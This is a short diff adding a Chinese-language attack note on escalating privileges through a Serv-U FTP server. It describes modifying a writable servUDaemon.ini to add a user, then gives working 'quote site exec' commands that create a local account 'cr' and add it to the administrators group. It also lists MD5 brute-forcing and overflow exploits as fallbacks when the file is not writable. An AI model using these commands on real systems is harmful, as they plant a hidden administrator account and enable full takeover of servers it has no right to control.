@@ -1,0 +1,16 @@
+有权限修改
+0.检查有无可写权限  修改server-u默认安装目录下的servUDaemon.ini
+1.增加用户
+2.连接
+3.执行命令
+quote site exec net user cr cr /add
+quote site exec net localgroup administrators cr /add
+
+无修改权限
+暴力破解MD5
+溢出提权
+
+
+
+关于MD5：
+通常：盐+密码
